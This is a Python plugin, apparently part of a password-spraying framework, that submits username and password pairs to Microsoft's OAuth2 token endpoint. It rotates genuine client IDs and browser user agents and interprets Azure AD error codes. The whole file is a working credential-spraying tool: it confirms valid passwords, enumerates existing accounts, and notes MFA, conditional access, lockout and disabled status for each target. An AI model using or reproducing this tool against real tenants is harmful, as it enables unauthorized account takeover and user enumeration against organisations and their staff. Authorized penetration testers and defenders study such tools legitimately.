import random

class Plugin:
    def __init__(self, requester, pluginargs):
        self.requester = requester
        self.pluginargs = {'url' : "https://login.microsoft.com", 'resource': "https://graph.microsoft.com"}
        if 'url' in pluginargs and pluginargs['url'] is not None:
            self.pluginargs['url'] = pluginargs['url']
        if 'resource' in pluginargs and pluginargs['resource'] is not None:
            self.pluginargs['resource'] = pluginargs['resource']
    
    def validate(self):
        err = ""
        val = True
        if not "url" in self.pluginargs.keys():
            val = False
            err = "MSOL plugin needs a 'url' argument. Please add it to the config file, specifying the Microsoft login page (should be 'https://login.microsoft.com')."
        if not "resource" in self.pluginargs.keys():
            val = False
            err = "MSOL plugin needs a 'resource' argument. Please add it to the config file, specifying the Microsoft resource (either 'https://graph.windows.net' or 'https://graph.microsoft.com')."
        if self.pluginargs["resource"] not in ['https://graph.windows.net', 'https://graph.microsoft.com']:
            val = False
            err = "MSOL plugin error, the resource is unknown. It should either be 'https://graph.windows.net' or 'https://graph.microsoft.com'"
        return val, err

    def testconnect(self, useragent):
        # return True
        r = self.requester.get(self.pluginargs["url"], headers={"User-Agent": useragent})
        return r.status_code != 504
    
    def test_authenticate(self, username, password, useragent):
        data_response = {
            'result' : None,    # Can be "success", "failure" or "potential"
            'error' : False,
            'output' : "",
            'request': None
        }

        client_ids = [
            # Microsoft Edge
            ("ecd6b820-32c2-49b6-98a6-444530e5a77a", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19045"),
            # Outlook Mobile
            ("27922004-5251-4030-b22d-91ecd9a37ea4", "Mozilla/5.0 (compatible; MSAL 1.0) PKeyAuth/1.0"),
        ]
        client_id, useragent = random.choice(client_ids)


        body = {
            'resource' : self.pluginargs["resource"],
            'client_id' : client_id,
            'client_info' : '1',
            'grant_type' : 'password',
            'username' : username,
            'password' : password,
            'scope' : 'openid',
        }

        headers = {
            "User-Agent" : useragent,
            'Accept' : 'application/json',
            'Content-Type' : 'application/x-www-form-urlencoded'
        }

        try:
            resp = self.requester.post(f"{self.pluginargs['url']}/common/oauth2/token", headers=headers, data=body)
            data_response['request'] = resp
            if resp.status_code == 200:
                data_response['result'] = "success"
                data_response['output'] = f"[+] SUCCESS: {username}:{password}"

            else:
                response = resp.json()
                error = response["error_description"]
                error_code = error.split(":")[0].strip()

                if "AADSTS50126" in error:
                    data_response['result'] = "failure"
                    data_response['output'] = f"[-] FAILURE ({error_code}): Invalid username or password. Username: {username} could exist"

                elif any([x in error for x in ["AADSTS50128", "AADSTS50059", "AADSTS50034"]]):
                    data_response['result'] = "inexistant"
                    data_response['output'] = f"[-] INEXISTANT ({error_code}): Tenant for account {username} is not using AzureAD/Office365"

                elif "AADSTS50056" in error:
                    data_response['result'] = "inexistant"
                    data_response['output'] = f"[-] INEXISTANT ({error_code}): Password does not exist in store for {username}"

                elif "AADSTS53003" in error:
                    # Access successful but blocked by CAP
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates token access is blocked by CAP"

                elif "AADSTS50076" in error:
                    # Microsoft MFA response
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"

                elif "AADSTS50079" in error:
                    # Microsoft MFA response
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!"

                elif "AADSTS50158" in error:
                    # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."

                elif "AADSTS53003" in error and not "AADSTS530034" in error:
                    # Conditional Access response as per https://github.com/dafthack/MSOLSpray/issues/5
                    data_response['result'] = "success"
                    data_response['output'] =f"SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."

                elif "AADSTS50053" in error:
                    # Locked out account or Smart Lockout in place
                    data_response['result'] = "potential"
                    data_response['output'] = f"[?] WARNING ({error_code}): The account {username} appears to be locked."

                elif "AADSTS50055" in error:
                    # User password is expired
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user's password is expired."

                elif "AADSTS50057" in error:
                    # The user account is disabled
                    data_response['result'] = "success"
                    data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user is disabled."

                else:
                    # Unknown errors
                    data_response['result'] = "potential"
                    data_response['output'] = f"[-] POTENTIAL ({error_code}): Got an error we haven't seen yet for user {username}"

        except Exception as ex:
            data_response['result'] = "failure"
            data_response['error'] = True
            data_response['output'] = str(ex.__repr__())
            pass

        return data_response
